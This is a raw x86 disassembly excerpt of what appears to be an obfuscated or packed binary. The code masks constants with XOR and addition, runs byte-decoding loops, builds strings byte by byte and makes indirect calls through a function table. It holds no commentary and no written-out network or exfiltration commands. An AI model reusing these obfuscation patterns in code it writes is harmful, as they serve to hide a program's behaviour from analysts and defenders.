  426847:	mov    DWORD PTR [ebp-0x1c],edi
  42684a:	mov    eax,DWORD PTR [ebp-0x20]
  42684d:	xor    eax,ebx
  42684f:	add    eax,esi
  426851:	jmp    0x426947
  426856:	mov    DWORD PTR [ebp-0xe0],0xf89c85b8
  426860:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  42686a:	mov    eax,DWORD PTR [ebp-0x1c]
  42686d:	mov    ecx,DWORD PTR [ebp-0x44]
  426870:	xor    eax,ebx
  426872:	add    eax,esi
  426874:	imul   eax,ecx
  426877:	mov    ecx,DWORD PTR [ebp-0x8]
  42687a:	mov    al,BYTE PTR [eax+ecx*1]
  42687d:	mov    BYTE PTR [ebp-0x2],al
  426880:	mov    eax,DWORD PTR [ebp-0x1c]
  426883:	mov    ecx,DWORD PTR [ebp-0x44]
  426886:	xor    eax,ebx
  426888:	add    eax,esi
  42688a:	imul   eax,ecx
  42688d:	mov    ecx,DWORD PTR [ebp-0xe8]
  426893:	xor    ecx,ebx
  426895:	add    eax,ecx
  426897:	mov    ecx,DWORD PTR [ebp-0x8]
  42689a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  4268a2:	mov    ecx,DWORD PTR [ebp-0xe0]
  4268a8:	xor    ecx,ebx
  4268aa:	lea    eax,[ecx+eax*1+0x3272f5]
  4268b1:	movzx  ecx,BYTE PTR [ebp-0x2]
  4268b5:	xor    ecx,eax
  4268b7:	mov    BYTE PTR [ebp-0x2],cl
  4268ba:	mov    al,BYTE PTR [ebp-0x2]
  4268bd:	mov    ecx,DWORD PTR [ebp-0x1c]
  4268c0:	mov    edx,DWORD PTR [ebp-0x44]
  4268c3:	xor    ecx,ebx
  4268c5:	add    ecx,esi
  4268c7:	imul   ecx,edx
  4268ca:	mov    edx,DWORD PTR [ebp-0x8]
  4268cd:	mov    BYTE PTR [ecx+edx*1],al
  4268d0:	mov    eax,DWORD PTR [ebp-0x1c]
  4268d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4268d6:	xor    eax,ebx
  4268d8:	add    eax,esi
  4268da:	imul   eax,ecx
  4268dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4268e0:	mov    al,BYTE PTR [eax+ecx*1]
  4268e3:	mov    BYTE PTR [ebp-0x2],al
  4268e6:	mov    eax,DWORD PTR [ebp-0x1c]
  4268e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4268ec:	xor    eax,ebx
  4268ee:	add    eax,esi
  4268f0:	imul   eax,ecx
  4268f3:	mov    ecx,DWORD PTR [ebp-0x34]
  4268f6:	xor    ecx,ebx
  4268f8:	add    eax,ecx
  4268fa:	mov    ecx,DWORD PTR [ebp-0x8]
  4268fd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426905:	mov    ecx,DWORD PTR [ebp-0xc4]
  42690b:	xor    ecx,ebx
  42690d:	lea    eax,[ecx+eax*1+0x3272f5]
  426914:	movzx  ecx,BYTE PTR [ebp-0x2]
  426918:	xor    ecx,eax
  42691a:	mov    BYTE PTR [ebp-0x2],cl
  42691d:	mov    al,BYTE PTR [ebp-0x2]
  426920:	mov    ecx,DWORD PTR [ebp-0x1c]
  426923:	mov    edx,DWORD PTR [ebp-0x44]
  426926:	xor    ecx,ebx
  426928:	add    ecx,esi
  42692a:	imul   ecx,edx
  42692d:	mov    edx,DWORD PTR [ebp-0x8]
  426930:	mov    BYTE PTR [ecx+edx*1],al
  426933:	mov    eax,DWORD PTR [ebp-0x30]
  426936:	mov    ecx,DWORD PTR [ebp-0x34]
  426939:	xor    eax,ebx
  42693b:	xor    ecx,ebx
  42693d:	add    eax,esi
  42693f:	add    ecx,esi
  426941:	imul   eax,ecx
  426944:	add    eax,DWORD PTR [ebp-0x44]
  426947:	mov    DWORD PTR [ebp-0x44],eax
  42694a:	mov    eax,DWORD PTR [ebp-0x44]
  42694d:	mov    ecx,DWORD PTR [ebp-0x14]
  426950:	cmp    ecx,eax
  426952:	jb     0x426856
  426958:	mov    eax,DWORD PTR [ebp-0x34]
  42695b:	mov    ecx,DWORD PTR [ebp-0x14]
  42695e:	xor    eax,ebx
  426960:	add    eax,esi
  426962:	imul   eax,ecx
  426965:	mov    ecx,DWORD PTR [ebp-0x20]
  426968:	xor    ecx,ebx
  42696a:	add    ecx,esi
  42696c:	or     eax,ecx
  42696e:	mov    ecx,DWORD PTR [ebp-0x2c]
  426971:	xor    ecx,ebx
  426973:	add    eax,ecx
  426975:	mov    ecx,DWORD PTR [ebp-0x2c]
  426978:	xor    ecx,ebx
  42697a:	add    eax,ecx
  42697c:	mov    ecx,DWORD PTR [ebp-0xc]
  42697f:	lea    eax,[eax+ecx*1+0x64e5ea]
  426986:	jmp    0x426997
  426988:	mov    eax,DWORD PTR [ebp-0x2c]
  42698b:	mov    ecx,DWORD PTR [ebp-0xc]
  42698e:	xor    eax,ebx
  426990:	lea    eax,[eax+ecx*1+0x3272f5]
  426997:	mov    DWORD PTR [ebp-0xc],eax
  42699a:	mov    eax,DWORD PTR [ebp-0x2c]
  42699d:	xor    eax,ebx
  42699f:	mov    ecx,0xffcd8d0b
  4269a4:	sub    ecx,eax
  4269a6:	add    ecx,DWORD PTR [ebp-0x28]
  4269a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4269ac:	mov    edx,DWORD PTR [ebp-0xc]
  4269af:	xor    eax,ebx
  4269b1:	add    eax,esi
  4269b3:	imul   eax,edx
  4269b6:	cmp    eax,ecx
  4269b8:	jbe    0x4267ca
  4269be:	mov    eax,DWORD PTR [ebp-0x10]
  4269c1:	mov    ecx,DWORD PTR [ebp-0x40]
  4269c4:	mov    eax,DWORD PTR [ebp+0x8]
  4269c7:	mov    edx,DWORD PTR [ebp-0x54]
  4269ca:	mov    eax,DWORD PTR [eax+0x1e0]
  4269d0:	xor    edx,ebx
  4269d2:	add    edx,esi
  4269d4:	push   edx
  4269d5:	mov    edx,DWORD PTR [ebp-0x3c]
  4269d8:	xor    edx,ebx
  4269da:	add    edx,esi
  4269dc:	push   edx
  4269dd:	push   ecx
  4269de:	mov    DWORD PTR [ebp-0x30],ecx
  4269e1:	mov    ecx,DWORD PTR [ebp-0x10]
  4269e4:	xor    ecx,ebx
  4269e6:	add    ecx,esi
  4269e8:	push   ecx
  4269e9:	call   DWORD PTR [eax+0x14]
  4269ec:	mov    edi,eax
  4269ee:	mov    eax,DWORD PTR [ebp-0x10]
  4269f1:	xor    eax,ebx
  4269f3:	add    eax,esi
  4269f5:	cmp    eax,edi
  4269f7:	je     0x426a52
  4269f9:	mov    eax,DWORD PTR [ebp-0x10]
  4269fc:	jmp    0x426a1f
  4269fe:	mov    ecx,DWORD PTR [ebp-0x24]
  426a01:	xor    eax,ebx
  426a03:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f5]
  426a0a:	mov    BYTE PTR [eax+edi*1+0x3272f5],cl
  426a11:	mov    ecx,DWORD PTR [ebp-0x18]
  426a14:	xor    ecx,ebx
  426a16:	lea    eax,[ecx+eax*1+0x3272f5]
  426a1d:	xor    eax,ebx
  426a1f:	mov    ecx,DWORD PTR [ebp-0x40]
  426a22:	sub    ecx,esi
  426a24:	xor    ecx,ebx
  426a26:	cmp    eax,ecx
  426a28:	jne    0x4269fe
  426a2a:	mov    eax,DWORD PTR [ebp+0x8]
  426a2d:	mov    ecx,DWORD PTR [ebp-0x50]
  426a30:	mov    eax,DWORD PTR [eax+0x1e0]
  426a36:	xor    ecx,ebx
  426a38:	add    ecx,esi
  426a3a:	push   ecx
  426a3b:	mov    ecx,DWORD PTR [ebp-0x10]
  426a3e:	xor    ecx,ebx
  426a40:	add    ecx,esi
  426a42:	push   ecx
  426a43:	push   DWORD PTR [ebp-0x24]
  426a46:	call   DWORD PTR [eax+0x18]
  426a49:	mov    eax,DWORD PTR [ebp-0x30]
  426a4c:	mov    DWORD PTR [ebp-0x24],edi
  426a4f:	mov    DWORD PTR [ebp-0x40],eax
  426a52:	mov    edi,DWORD PTR [ebp-0x24]
  426a55:	mov    eax,DWORD PTR [ebp-0x18]
  426a58:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5b:	xor    eax,ebx
  426a5d:	mov    DWORD PTR [ebp-0x30],edi
  426a60:	add    eax,esi
  426a62:	mov    DWORD PTR [ebp-0x5c],0x402b332b
  426a69:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  426a70:	jmp    0x426aa4
  426a72:	xor    ecx,ebx
  426a74:	mov    dl,BYTE PTR [ebp+ecx*1+0x327299]
  426a7b:	xor    dl,0x7e
  426a7e:	add    dl,0x3
  426a81:	mov    DWORD PTR [ebp-0x3c],ecx
  426a84:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f5]
  426a8c:	movzx  edx,dl
  426a8f:	cmp    ecx,edx
  426a91:	jne    0x426aae
  426a93:	mov    ecx,DWORD PTR [ebp-0x18]
  426a96:	mov    edx,DWORD PTR [ebp-0x3c]
  426a99:	xor    ecx,ebx
  426a9b:	lea    ecx,[ecx+edx*1+0x3272f5]
  426aa2:	xor    ecx,ebx
  426aa4:	cmp    ecx,0xf89c85bd
  426aaa:	jne    0x426a72
  426aac:	jmp    0x426ab5
  426aae:	mov    eax,DWORD PTR [ebp-0x10]
  426ab1:	xor    eax,ebx
  426ab3:	add    eax,esi
  426ab5:	mov    ecx,DWORD PTR [ebp-0x10]
  426ab8:	xor    ecx,ebx
  426aba:	add    ecx,esi
  426abc:	cmp    ecx,eax
  426abe:	je     0x426c31
  426ac4:	mov    eax,DWORD PTR [edi+0x8]
  426ac7:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426ace:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  426ad5:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  426adc:	mov    DWORD PTR [ebp-0x20],0xf89c85a1
  426ae3:	mov    DWORD PTR [ebp-0x14],eax
  426ae6:	mov    eax,DWORD PTR [ebp+0x8]
  426ae9:	mov    ecx,DWORD PTR [ebp-0x20]
  426aec:	xor    ecx,ebx
  426aee:	add    ecx,esi
  426af0:	push   ecx
  426af1:	mov    ecx,DWORD PTR [ebp-0x48]
  426af4:	mov    eax,DWORD PTR [eax+0x1e0]
  426afa:	xor    ecx,ebx
  426afc:	add    ecx,esi
  426afe:	push   ecx
  426aff:	mov    ecx,DWORD PTR [ebp-0x3c]
  426b02:	xor    ecx,ebx
  426b04:	add    ecx,esi
  426b06:	push   ecx
  426b07:	mov    ecx,DWORD PTR [ebp-0xc]
  426b0a:	xor    ecx,ebx
  426b0c:	add    ecx,esi
  426b0e:	push   ecx
  426b0f:	call   DWORD PTR [eax+0x14]
  426b12:	mov    edi,eax
  426b14:	mov    eax,DWORD PTR [ebp+0x8]
  426b17:	mov    ecx,DWORD PTR [ebp-0x20]
  426b1a:	mov    eax,DWORD PTR [eax+0x1e0]
  426b20:	xor    ecx,ebx
  426b22:	add    ecx,esi
  426b24:	push   ecx
  426b25:	mov    ecx,DWORD PTR [ebp-0x48]
  426b28:	xor    ecx,ebx
  426b2a:	add    ecx,esi
  426b2c:	push   ecx
  426b2d:	mov    ecx,DWORD PTR [ebp-0xc]
  426b30:	push   DWORD PTR [ebp-0x14]
  426b33:	xor    ecx,ebx
  426b35:	add    ecx,esi
  426b37:	push   ecx
  426b38:	call   DWORD PTR [eax+0x14]
  426b3b:	mov    ecx,DWORD PTR [ebp-0xc]
  426b3e:	xor    ecx,ebx
  426b40:	add    ecx,esi
  426b42:	mov    DWORD PTR [ebp-0x20],eax
  426b45:	cmp    ecx,edi
  426b47:	je     0x426ed4
  426b4d:	mov    ecx,DWORD PTR [ebp-0xc]
  426b50:	xor    ecx,ebx
  426b52:	add    ecx,esi
  426b54:	cmp    ecx,eax
  426b56:	je     0x426ed4
  426b5c:	mov    DWORD PTR [ebp-0x3c],0xf89c85a0
  426b63:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426b6a:	mov    ecx,DWORD PTR [ebp-0x3c]
  426b6d:	xor    cl,0xae
  426b70:	sub    cl,0xb
  426b73:	mov    BYTE PTR [edi],cl
  426b75:	mov    ecx,DWORD PTR [ebp-0xc]
  426b78:	xor    cl,0xae
  426b7b:	sub    cl,0xb
  426b7e:	mov    BYTE PTR [edi+0x1],cl
  426b81:	mov    ecx,DWORD PTR [ebp-0x54]
  426b84:	xor    cl,0xae
  426b87:	sub    cl,0xb
  426b8a:	mov    BYTE PTR [edi+0x2],cl
  426b8d:	and    DWORD PTR [ebp-0xc8],0x0
  426b94:	and    DWORD PTR [ebp-0xdc],0x0
  426b9b:	lea    ecx,[ebp-0xdc]
  426ba1:	push   ecx
  426ba2:	push   DWORD PTR [ebp-0x14]
  426ba5:	push   eax
  426ba6:	lea    eax,[ebp-0xc8]
  426bac:	push   eax
  426bad:	mov    eax,DWORD PTR [ebp-0x30]
  426bb0:	push   DWORD PTR [eax+0xc]
  426bb3:	mov    eax,DWORD PTR [ebp-0x24]
  426bb6:	add    eax,0x10
  426bb9:	push   eax
  426bba:	push   edi
  426bbb:	call   0x425e61
  426bc0:	mov    DWORD PTR [ebp-0x3c],eax
  426bc3:	mov    eax,DWORD PTR [ebp+0x8]
  426bc6:	mov    ecx,DWORD PTR [ebp-0x50]
  426bc9:	mov    eax,DWORD PTR [eax+0x1e0]
  426bcf:	xor    ecx,ebx
  426bd1:	add    ecx,esi
  426bd3:	push   ecx
  426bd4:	mov    ecx,DWORD PTR [ebp-0xc]
  426bd7:	xor    ecx,ebx
  426bd9:	add    ecx,esi
  426bdb:	push   ecx
  426bdc:	push   edi
  426bdd:	call   DWORD PTR [eax+0x18]
  426be0:	mov    eax,DWORD PTR [ebp-0x3c]
  426be3:	add    eax,0xffcd8d0b
  426be8:	xor    eax,ebx
  426bea:	cmp    eax,0xf89c85a5
  426bef:	mov    eax,DWORD PTR [ebp+0x8]
  426bf2:	mov    eax,DWORD PTR [eax+0x1e0]
  426bf8:	mov    ecx,DWORD PTR [ebp-0x50]
  426bfb:	jne    0x426c1e
  426bfd:	xor    ecx,ebx
  426bff:	add    ecx,esi
  426c01:	push   ecx
  426c02:	mov    ecx,DWORD PTR [ebp-0xc]
  426c05:	xor    ecx,ebx
  426c07:	add    ecx,esi
  426c09:	push   ecx
  426c0a:	push   DWORD PTR [ebp-0x24]
  426c0d:	call   DWORD PTR [eax+0x18]
  426c10:	mov    eax,DWORD PTR [ebp-0x20]
  426c13:	mov    DWORD PTR [ebp-0x24],eax
  426c16:	mov    eax,DWORD PTR [ebp-0x14]
  426c19:	mov    DWORD PTR [ebp-0x40],eax
  426c1c:	jmp    0x426c31
  426c1e:	xor    ecx,ebx
  426c20:	add    ecx,esi
  426c22:	push   ecx
  426c23:	mov    ecx,DWORD PTR [ebp-0xc]
  426c26:	xor    ecx,ebx
  426c28:	add    ecx,esi
  426c2a:	push   ecx
  426c2b:	push   DWORD PTR [ebp-0x20]
  426c2e:	call   DWORD PTR [eax+0x18]
  426c31:	mov    eax,DWORD PTR [ebp-0x40]
  426c34:	mov    DWORD PTR [ebp-0x38],eax
  426c37:	mov    eax,DWORD PTR [ebp-0x24]
  426c3a:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426c41:	mov    DWORD PTR [ebp-0x3c],eax
  426c44:	mov    edi,0xf89c85a2
  426c49:	mov    DWORD PTR [ebp-0x2c],edi
  426c4c:	mov    eax,DWORD PTR [ebp-0x28]
  426c4f:	xor    eax,ebx
  426c51:	add    eax,esi
  426c53:	mov    DWORD PTR [ebp-0xc],eax
  426c56:	mov    eax,DWORD PTR [ebp-0x28]
  426c59:	xor    eax,ebx
  426c5b:	add    eax,esi
  426c5d:	mov    DWORD PTR [ebp-0x14],eax
  426c60:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  426c67:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  426c6e:	mov    eax,DWORD PTR [ebp-0x28]
  426c71:	mov    ecx,DWORD PTR [ebp-0x38]
  426c74:	xor    eax,ebx
  426c76:	add    eax,esi
  426c78:	cmp    ecx,eax
  426c7a:	je     0x426e70
  426c80:	jmp    0x426e4c
  426c85:	mov    ecx,DWORD PTR [ebp-0xc]
  426c88:	mov    eax,DWORD PTR [ebp-0x38]
  426c8b:	sub    eax,ecx
  426c8d:	mov    ecx,DWORD PTR [ebp-0x48]
  426c90:	xor    ecx,ebx
  426c92:	add    ecx,esi
  426c94:	xor    edx,edx
  426c96:	div    ecx
  426c98:	mov    DWORD PTR [ebp-0x14],eax
  426c9b:	mov    eax,DWORD PTR [ebp-0x20]
  426c9e:	mov    ecx,DWORD PTR [ebp-0x14]
  426ca1:	xor    eax,ebx
  426ca3:	add    eax,esi
  426ca5:	cmp    ecx,eax
  426ca7:	jbe    0x426cb3
  426ca9:	mov    eax,DWORD PTR [ebp-0x20]
  426cac:	xor    eax,ebx
  426cae:	add    eax,esi
  426cb0:	mov    DWORD PTR [ebp-0x14],eax
  426cb3:	mov    eax,DWORD PTR [ebp-0x48]
  426cb6:	mov    ecx,DWORD PTR [ebp-0x14]
  426cb9:	xor    eax,ebx
  426cbb:	add    eax,esi
  426cbd:	imul   eax,ecx
  426cc0:	mov    DWORD PTR [ebp-0x14],eax
  426cc3:	mov    eax,DWORD PTR [ebp-0x28]
  426cc6:	mov    ecx,DWORD PTR [ebp-0x14]
  426cc9:	xor    eax,ebx
  426ccb:	add    eax,esi
  426ccd:	cmp    ecx,eax
  426ccf:	je     0x426e3a
  426cd5:	mov    eax,DWORD PTR [ebp-0x14]
  426cd8:	mov    DWORD PTR [ebp-0x34],eax
  426cdb:	mov    eax,DWORD PTR [ebp-0xc]
  426cde:	add    eax,DWORD PTR [ebp-0x3c]
  426ce1:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  426ce8:	mov    DWORD PTR [ebp-0x14],edi
  426ceb:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426cf2:	mov    DWORD PTR [ebp-0x1c],eax
  426cf5:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  426cfc:	mov    DWORD PTR [ebp-0x8],edi
  426cff:	mov    eax,DWORD PTR [ebp-0x4c]
  426d02:	xor    eax,ebx
  426d04:	add    eax,esi
  426d06:	jmp    0x426df9
  426d0b:	mov    DWORD PTR [ebp-0xe4],0xf89c85b8
  426d15:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426d1f:	mov    eax,DWORD PTR [ebp-0x8]
  426d22:	mov    ecx,DWORD PTR [ebp-0x18]
  426d25:	xor    eax,ebx
  426d27:	add    eax,esi
  426d29:	imul   eax,ecx
  426d2c:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d2f:	mov    al,BYTE PTR [eax+ecx*1]
  426d32:	mov    BYTE PTR [ebp-0x1],al
  426d35:	mov    eax,DWORD PTR [ebp-0x8]
  426d38:	mov    ecx,DWORD PTR [ebp-0x18]
  426d3b:	xor    eax,ebx
  426d3d:	add    eax,esi
  426d3f:	imul   eax,ecx
  426d42:	mov    ecx,DWORD PTR [ebp-0x54]
  426d45:	xor    ecx,ebx
  426d47:	add    eax,ecx
  426d49:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d4c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426d54:	mov    ecx,DWORD PTR [ebp-0xe4]
  426d5a:	xor    ecx,ebx
  426d5c:	lea    eax,[ecx+eax*1+0x3272f5]
  426d63:	movzx  ecx,BYTE PTR [ebp-0x1]
  426d67:	xor    ecx,eax
  426d69:	mov    BYTE PTR [ebp-0x1],cl
  426d6c:	mov    al,BYTE PTR [ebp-0x1]
  426d6f:	mov    ecx,DWORD PTR [ebp-0x8]
  426d72:	mov    edx,DWORD PTR [ebp-0x18]
  426d75:	xor    ecx,ebx
  426d77:	add    ecx,esi
  426d79:	imul   ecx,edx
  426d7c:	mov    edx,DWORD PTR [ebp-0x1c]
  426d7f:	mov    BYTE PTR [ecx+edx*1],al
  426d82:	mov    eax,DWORD PTR [ebp-0x8]
  426d85:	mov    ecx,DWORD PTR [ebp-0x18]
  426d88:	xor    eax,ebx
  426d8a:	add    eax,esi
  426d8c:	imul   eax,ecx
  426d8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d92:	mov    al,BYTE PTR [eax+ecx*1]
  426d95:	mov    BYTE PTR [ebp-0x1],al
  426d98:	mov    eax,DWORD PTR [ebp-0x8]
  426d9b:	mov    ecx,DWORD PTR [ebp-0x18]
  426d9e:	xor    eax,ebx
  426da0:	add    eax,esi
  426da2:	imul   eax,ecx
  426da5:	mov    ecx,DWORD PTR [ebp-0x14]
  426da8:	xor    ecx,ebx
  426daa:	add    eax,ecx
  426dac:	mov    ecx,DWORD PTR [ebp-0x1c]
  426daf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426db7:	mov    ecx,DWORD PTR [ebp-0xd0]
  426dbd:	xor    ecx,ebx
  426dbf:	lea    eax,[ecx+eax*1+0x3272f5]
  426dc6:	movzx  ecx,BYTE PTR [ebp-0x1]
  426dca:	xor    ecx,eax
  426dcc:	mov    BYTE PTR [ebp-0x1],cl
  426dcf:	mov    al,BYTE PTR [ebp-0x1]
  426dd2:	mov    ecx,DWORD PTR [ebp-0x8]
  426dd5:	mov    edx,DWORD PTR [ebp-0x18]
  426dd8:	xor    ecx,ebx
  426dda:	add    ecx,esi
  426ddc:	imul   ecx,edx
  426ddf:	mov    edx,DWORD PTR [ebp-0x1c]
  426de2:	mov    BYTE PTR [ecx+edx*1],al
  426de5:	mov    eax,DWORD PTR [ebp-0x30]
  426de8:	mov    ecx,DWORD PTR [ebp-0x14]
  426deb:	xor    eax,ebx
  426ded:	xor    ecx,ebx
  426def:	add    eax,esi
  426df1:	add    ecx,esi
  426df3:	imul   eax,ecx
  426df6:	add    eax,DWORD PTR [ebp-0x18]
  426df9:	mov    DWORD PTR [ebp-0x18],eax
  426dfc:	mov    eax,DWORD PTR [ebp-0x18]
  426dff:	mov    ecx,DWORD PTR [ebp-0x34]
  426e02:	cmp    ecx,eax
  426e04:	jb     0x426d0b
  426e0a:	mov    eax,DWORD PTR [ebp-0x14]
  426e0d:	mov    ecx,DWORD PTR [ebp-0x34]
  426e10:	xor    eax,ebx
  426e12:	add    eax,esi
  426e14:	imul   eax,ecx
  426e17:	mov    ecx,DWORD PTR [ebp-0x4c]
  426e1a:	xor    ecx,ebx
  426e1c:	add    ecx,esi
  426e1e:	or     eax,ecx
  426e20:	mov    ecx,DWORD PTR [ebp-0x2c]
  426e23:	xor    ecx,ebx
  426e25:	add    eax,ecx
  426e27:	mov    ecx,DWORD PTR [ebp-0x2c]
  426e2a:	xor    ecx,ebx
  426e2c:	add    eax,ecx
  426e2e:	mov    ecx,DWORD PTR [ebp-0xc]
  426e31:	lea    eax,[eax+ecx*1+0x64e5ea]
  426e38:	jmp    0x426e49
  426e3a:	mov    eax,DWORD PTR [ebp-0x2c]
  426e3d:	mov    ecx,DWORD PTR [ebp-0xc]
  426e40:	xor    eax,ebx
  426e42:	lea    eax,[eax+ecx*1+0x3272f5]
  426e49:	mov    DWORD PTR [ebp-0xc],eax
  426e4c:	mov    eax,DWORD PTR [ebp-0x2c]
  426e4f:	xor    eax,ebx
  426e51:	mov    ecx,0xffcd8d0b
  426e56:	sub    ecx,eax
  426e58:	add    ecx,DWORD PTR [ebp-0x38]
  426e5b:	mov    eax,DWORD PTR [ebp-0x2c]
  426e5e:	mov    edx,DWORD PTR [ebp-0xc]
  426e61:	xor    eax,ebx
  426e63:	add    eax,esi
  426e65:	imul   eax,edx
  426e68:	cmp    eax,ecx
  426e6a:	jbe    0x426c85
  426e70:	push   DWORD PTR [ebp+0x8]
  426e73:	mov    eax,DWORD PTR [ebp+0x8]
  426e76:	push   DWORD PTR [eax+0x1cc]
  426e7c:	lea    eax,[ebp-0xd8]
  426e82:	push   eax
  426e83:	mov    eax,DWORD PTR [ebp+0x8]
  426e86:	mov    eax,DWORD PTR [eax+0x1c4]
  426e8c:	push   DWORD PTR [eax]
  426e8e:	mov    eax,DWORD PTR [ebp+0x8]
  426e91:	mov    eax,DWORD PTR [eax+0x1c0]
  426e97:	push   DWORD PTR [eax]
  426e99:	push   DWORD PTR [ebp-0x40]
  426e9c:	push   DWORD PTR [ebp-0x24]
  426e9f:	call   0x427936
  426ea4:	mov    DWORD PTR [ebp-0x3c],eax
  426ea7:	mov    eax,DWORD PTR [ebp-0x10]
  426eaa:	mov    ecx,DWORD PTR [ebp-0x24]
  426ead:	xor    eax,ebx
  426eaf:	add    eax,esi
  426eb1:	cmp    eax,ecx
  426eb3:	je     0x426ed4
  426eb5:	mov    eax,DWORD PTR [ebp+0x8]
  426eb8:	mov    ecx,DWORD PTR [ebp-0x50]
  426ebb:	mov    eax,DWORD PTR [eax+0x1e0]
  426ec1:	xor    ecx,ebx
  426ec3:	add    ecx,esi
  426ec5:	push   ecx
  426ec6:	mov    ecx,DWORD PTR [ebp-0x10]
  426ec9:	xor    ecx,ebx
  426ecb:	add    ecx,esi
  426ecd:	push   ecx
  426ece:	push   DWORD PTR [ebp-0x24]
  426ed1:	call   DWORD PTR [eax+0x18]
  426ed4:	pop    edi
  426ed5:	pop    esi
  426ed6:	pop    ebx
  426ed7:	leave  
  426ed8:	ret    0x4
  426edb:	push   ebp
  426edc:	mov    ebp,esp
  426ede:	push   ecx
  426edf:	push   ecx
  426ee0:	lea    eax,[ebp-0x8]
  426ee3:	mov    DWORD PTR [ebp-0x4],eax
  426ee6:	push   esi
  426ee7:	mov    esi,DWORD PTR [ebp-0x4]
  426eea:	mov    eax,0xf881ba2f
  426eef:	mov    DWORD PTR [esi],eax
  426ef1:	mov    esi,DWORD PTR [ebp-0x8]
  426ef4:	cmp    esi,eax
  426ef6:	pop    esi
  426ef7:	jne    0x426f01
  426ef9:	mov    BYTE PTR [ecx+0xa],0x83
  426efd:	mov    BYTE PTR [edx+0x8],0x2e
  426f01:	mov    BYTE PTR [edx+0xa],0x83
  426f05:	mov    BYTE PTR [ecx+0x2],0x15
  426f09:	leave  
  426f0a:	ret    
  426f0b:	push   ebp
  426f0c:	mov    ebp,esp
  426f0e:	push   ecx
  426f0f:	push   ecx
  426f10:	lea    eax,[ebp-0x8]
  426f13:	mov    DWORD PTR [ebp-0x4],eax
  426f16:	mov    edx,DWORD PTR [ebp-0x4]
  426f19:	mov    eax,0xf88b0bcb
  426f1e:	mov    DWORD PTR [edx],eax
  426f20:	mov    edx,DWORD PTR [ebp-0x8]
  426f23:	cmp    edx,eax
  426f25:	jne    0x426f36
  426f27:	mov    eax,DWORD PTR [ebp+0x8]
  426f2a:	mov    BYTE PTR [ecx+0x9],0xf
  426f2e:	mov    BYTE PTR [eax+0x7],0x56
  426f32:	mov    BYTE PTR [ecx+0x6],0xe
  426f36:	mov    BYTE PTR [ecx+0x3],0x1f
  426f3a:	leave  
  426f3b:	ret    0x4
  426f3e:	push   ebp
  426f3f:	mov    ebp,esp
  426f41:	push   ecx
  426f42:	push   ecx
  426f43:	lea    eax,[ebp-0x8]
  426f46:	mov    DWORD PTR [ebp-0x4],eax
  426f49:	mov    edx,DWORD PTR [ebp-0x4]
  426f4c:	mov    eax,0x7e0da2f
  426f51:	mov    DWORD PTR [edx],eax
  426f53:	mov    edx,DWORD PTR [ebp-0x8]
  426f56:	cmp    edx,eax
  426f58:	jne    0x426f5e
  426f5a:	mov    BYTE PTR [ecx+0x7],0x56
  426f5e:	mov    eax,DWORD PTR [ebp+0x8]
  426f61:	mov    BYTE PTR [ecx+0x1],0x18
  426f65:	mov    BYTE PTR [eax+0x9],0x2f
  426f69:	leave  
  426f6a:	ret    0x4
  426f6d:	push   ebp
  426f6e:	mov    ebp,esp
  426f70:	push   ecx
  426f71:	push   ecx
  426f72:	lea    eax,[ebp-0x8]
  426f75:	mov    DWORD PTR [ebp-0x4],eax
  426f78:	push   esi
  426f79:	mov    esi,DWORD PTR [ebp-0x4]
  426f7c:	mov    eax,0x7060e3c
  426f81:	mov    DWORD PTR [esi],eax
  426f83:	mov    esi,DWORD PTR [ebp-0x8]
  426f86:	cmp    esi,eax
  426f88:	pop    esi
  426f89:	jne    0x426f95
  426f8b:	mov    BYTE PTR [edx+0x4],0x12
  426f8f:	mov    WORD PTR [ecx+0x3],0x121f
  426f95:	mov    BYTE PTR [edx],0x3e
  426f98:	leave  
  426f99:	ret    
  426f9a:	push   ebp
  426f9b:	mov    ebp,esp
  426f9d:	push   ecx
  426f9e:	push   ecx
  426f9f:	lea    eax,[ebp-0x8]
  426fa2:	mov    DWORD PTR [ebp-0x4],eax
  426fa5:	mov    edx,DWORD PTR [ebp-0x4]
  426fa8:	mov    eax,0xf8870b3f
  426fad:	mov    DWORD PTR [edx],eax
  426faf:	mov    edx,DWORD PTR [ebp-0x8]
  426fb2:	cmp    edx,eax
  426fb4:	jne    0x426fc1
  426fb6:	mov    eax,DWORD PTR [ebp+0x8]
  426fb9:	mov    BYTE PTR [ecx+0x8],0xe
  426fbd:	mov    BYTE PTR [eax+0x1],0x18
  426fc1:	mov    BYTE PTR [ecx+0x5],0xa
  426fc5:	leave  
  426fc6:	ret    0x4
  426fc9:	push   esi
  426fca:	mov    ecx,edi
  426fcc:	call   0x426f9a
  426fd1:	mov    edx,edi
  426fd3:	mov    ecx,esi
  426fd5:	mov    BYTE PTR [esi],0x1e
  426fd8:	call   0x426f6d
  426fdd:	push   esi
  426fde:	mov    ecx,edi
  426fe0:	mov    BYTE PTR [esi+0x5],0xa
  426fe4:	call   0x426f3e
  426fe9:	push   esi
  426fea:	mov    BYTE PTR [esi+0x6],0xe
  426fee:	call   0x426f0b
  426ff3:	mov    BYTE PTR [esi+0x2],0x15
  426ff7:	mov    edx,esi
  426ff9:	jmp    0x426edb
  426ffe:	push   ebp
